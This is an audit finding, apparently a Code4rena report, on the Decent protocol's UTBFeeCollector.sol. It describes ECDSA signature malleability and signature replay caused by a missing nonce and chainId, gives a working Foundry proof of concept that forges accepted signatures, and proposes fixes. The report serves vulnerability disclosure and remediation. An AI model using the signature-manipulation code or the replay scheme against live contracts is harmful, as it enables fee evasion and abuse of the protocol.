## Possible replay attacks & signature malleability possible in the ```UTBFeeCollector.sol``` contract
Replay:
Since users can opt to pay their fees in either native gas tokens or ERC20's, future situations where previous amounts from ```FeeStructure.feeAmount``` could be worth re-using instead of the current ones.
This becomes especially critical if the used ERC20's in question die out or lose significant value. This could potentially lead to users paying next to nothing for using the protocols bridge.

Signature malleability:
Invalid signatures that derive from original ones can be used & will generate the expected signer address in ```UTBFeeCollector```.

Source of both vulnerabilities: 
https://github.com/code-423n4/2024-01-decent/blob/main/src/UTBFeeCollector.sol#L26
Affecting: ```UTB.sol``` functionality.

## Signature Malleability is possible:
Modified signatures are accepted by the protocol, which is not optimal.
This issue arises due to not following the ECDSA standard proposed by OpenZeppelin. The following lines, dont check for correct ```s``` values:
```
        require(signature.length == 65, "Invalid signature length");

        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
```
For ```Lower s normalization values``` need to be compared with 
```0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141``` to ensure the number is in the correct range, following the Ethereum Yellow pages.
https://github.com/OpenZeppelin/openzeppelin-contracts/blob/a51f1e1354dbae62cec024d2590de5cab249a27c/contracts/utils/cryptography/ECDSA.sol#L129

## Replay Attack:
The replay attack is enabled due to a lack of ```nonce``` & ```chainId``` inside the dataHash which is then signed by the trusted address. This allows users to re-use the same signature multiple times for the same dataHash(instructions).
```UTBFeeCollector.sol``` Ln: 49
```
        bytes32 constructedHash = keccak256(
            abi.encodePacked(BANNER, keccak256(packedInfo))
        );
```
Here we can see that the dataHash consists of: ```BANNER(string) + packedInfo(bytes)```. ```packedInfo``` consisting of: ```abi.encode(instructions, fees)``` these being structs of ```SwapAndExecuteInstructions```, ```FeeStructure``` :
```
struct SwapInstructions {
    uint8 swapperId;       // Which swapper contract to use
    bytes swapPayload;     // Instructions for swap "path"
}

struct FeeStructure {
    uint bridgeFee;
    address feeToken;
    uint feeAmount;
}

struct SwapAndExecuteInstructions {
    SwapInstructions swapInstructions;
    address target;                    
    address paymentOperator;
    address payable refund;
    bytes payload;
}
```
Here you can observe that the dataHash does not contain a ```chainId``` nor any accounting system "```nonce```" that would prevent replay attacks.

Once again the OpenZeppelin standard suggests using both of these to prevent replay attacks.

## Foundry POC signature malleablity:
This POC shows that even modified signatures are accepted by the UTBFeeCollector contract:
```
// SPDX-License-Identifier: Built by Mango
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {UTBFeeCollector} from "../../src/UTBFeeCollector.sol";
import "../../src/CommonTypes.sol";

contract POC is Test {

    UTBFeeCollector utbFeeCollector;
    Vm.Wallet public signer;
    address mockUtb = address(0x789);
    string constant BANNER = "\x19Ethereum Signed Message:\n32";

    function setUp() public {
        signer = vm.createWallet("signer");
        vm.startPrank(signer.addr);
        utbFeeCollector = new UTBFeeCollector();
        utbFeeCollector.setSigner(signer.addr);
        utbFeeCollector.setUtb(mockUtb);
        assertTrue(signer.addr != address(0x0));
        // Signer variable is in slot0:
        bytes32 _signer = vm.load(address(utbFeeCollector), 0);
        assertEq(signer.addr, address(uint160(uint256(_signer))));
        vm.stopPrank();
    }

    function testPOC() public {
        // Building dataHash:
        bytes memory packedInfo = abi.encode("MockInfo");
        bytes32 dataHash = keccak256(abi.encodePacked(
            BANNER,
            keccak256(packedInfo)
        ));

        // Front end gives us the legitimate signature:
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signer, dataHash);
        bytes memory validSignature = abi.encodePacked(r,s,v);

        // Ensuring signature throws signer.addr as its public key:
        vm.startPrank(mockUtb);
        utbFeeCollector.collectFees{value: 0}(FeeStructure({
            bridgeFee: 123,
            feeToken: address(0x0),
            feeAmount: 123
        }),
        packedInfo,
        validSignature
        );

        // Modifying the signature:
        bytes memory modifiedSig = manipulateSignature(validSignature);

        // Calling collectFee() with invalid signature:
        utbFeeCollector.collectFees{value: 0}(FeeStructure({
            bridgeFee: 123,
            feeToken: address(0x0),
            feeAmount: 123
        }),
        packedInfo,
        modifiedSig
        );
        // Accepts invalid signature with modified s value.
    }

    function manipulateSignature(bytes memory signature) public pure returns(bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = splitSignature(signature);

        uint8 manipulatedV = v % 2 == 0 ? v - 1 : v + 1;
        uint256 manipulatedS = modNegS(uint256(s));
        bytes memory manipulatedSignature = abi.encodePacked(r, bytes32(manipulatedS), manipulatedV);

        return manipulatedSignature;
    }

    function splitSignature(bytes memory sig) public pure returns (uint8 v, bytes32 r, bytes32 s) {
        require(sig.length == 65, "Invalid signature length");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
        if (v < 27) {
            v += 27;
        }
        require(v == 27 || v == 28, "Invalid signature v value");
    }

    function modNegS(uint256 s) public pure returns (uint256) {

        uint256 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
        return n - s;
    }
}
```

## Abstract POC Replay attack:
Lets assume the protocol accepts ```PEPE``` as an acceptable ERC20 to pay for the bridging system. Since the worth of said ERC20 is currently healthy, there is are no issues for the owners of Decent to accept the payment in this form.

Now lets say ```PEPE``` crashes due to rugpulls or some external reasons, leaving liquidity pools of ```PEPE/WETH``` mostly empty in ```WETH```.
This means the user who once got a valid signature for bridging specific amounts to a specific chain, specified in the dataHash which got signed, can re-use the old signature. This time paying the fees in ```PEPE``` which is worthless.
Note that price crashes don't need to make this attack significant, even just price swings can be exploited into having to pay less in fees. 

The same scenario can be played with native ETH or any gas token at that.

## Proposed solutions:
To prevent invalid signatures from being used in the protocol, i recommend using the ECDSA.sol contract from OpenZeppelin. This contracts error handling ensures that only signatures generated by the signer itself will be accepted.

To prevent potential replay attacks in the future, the OpenZeppelin standard recommends including values like ```block.chainid``` and ```nonce``` into the signed dataHash. This ensures that said signature, will only be valid for that said nonce instance.
Personally: For this specific architecture, a nonce system might not be ideal, since natural front running could occur with multiple users using the dapp at the same time. I would suggest including ```blockNumber``` into the dataHash as well as perhaps modifying the ```BANNER``` string in ```UTBFeeCollector.sol``` to match each specific chain. So perhaps ```BANNER = "\x19Ethereum Signed Message:\n32"``` for Eth mainnet and ```BANNER = "\x19Fantom Signed Message:\n32"``` for Ftm, and so on. Including values like these in the dataHash will ensure that the provided signature by the front end will only be valid for the current block. Block.timestamp can also be used, but account for validators being able to manipulate this value 13 seconds ahead from the previous block header value.